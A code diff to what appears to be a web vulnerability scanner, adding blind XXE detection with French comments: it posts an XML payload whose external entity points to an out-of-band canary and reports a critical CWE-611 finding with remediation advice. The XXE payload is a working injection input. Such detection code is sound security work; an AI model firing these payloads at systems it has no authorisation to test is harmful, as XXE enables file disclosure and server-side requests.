@@ -15,6 +15,7 @@ import re
 
 from scanner.core import http
 from scanner.core.module_base import ScannerModule, Finding
+from scanner.core.oob import OOBCanary
 from scanner.payloads import get_payloads
 
 
@@ -37,6 +38,45 @@ class XxeModule(ScannerModule):
             return []
 
         findings: List[Finding] = []
+
+        # === XXE aveugle via rappel OOB ===
+        # Entité externe pointant sur le canary : si le parseur la résout, le
+        # serveur appelle notre canary -> preuve imparable, sans retour visible.
+        canary = OOBCanary.new(context)
+        if canary.url:
+            oob_payload = (
+                '<?xml version="1.0"?>'
+                f'<!DOCTYPE r [<!ENTITY xxe SYSTEM "{canary.url}">]>'
+                '<r>&xxe;</r>'
+            )
+            try:
+                http.post(target, context, capture=True, data=oob_payload, timeout=8, headers={
+                    "Content-Type": "application/xml", "User-Agent": "VulnScan/1.2",
+                })
+            except Exception:
+                pass
+            left = http.time_left(context)
+            wait = 4 if left is None else min(4, left)
+            if wait > 0 and canary.wait_for_hit(context, timeout=wait):
+                hit = canary.hits()[0] if canary.hits() else {}
+                findings.append(Finding(
+                    type="xxe", severity="critical",
+                    title="XXE aveugle confirmé via OOB",
+                    description=(
+                        f"Le parseur XML a résolu une entité externe pointant vers le canary "
+                        f"{canary.url} (méthode {hit.get('method', '?')}). XXE exploitable "
+                        "même sans retour visible dans la réponse."
+                    ),
+                    recommendation=(
+                        "Désactiver les entités externes et les DOCTYPE côté parseur "
+                        "(defusedxml, disallow-doctype-decl, libxml_disable_entity_loader)."
+                    ),
+                    url=target, parameter="(body XML)", payload=oob_payload,
+                    evidence=f"Hit OOB : {hit.get('method')} from {hit.get('ip')} UA={hit.get('user_agent', '')[:60]}",
+                    confidence=95, cwe_id="CWE-611", owasp_id="A05:2021", cvss_base=9.8,
+                    detection_method="oob-canary", source="module:xxe",
+                ))
+                return findings
 
         # Signatures :
         #  - erreur de DOCTYPE / DTD non autorisé → bon comportement
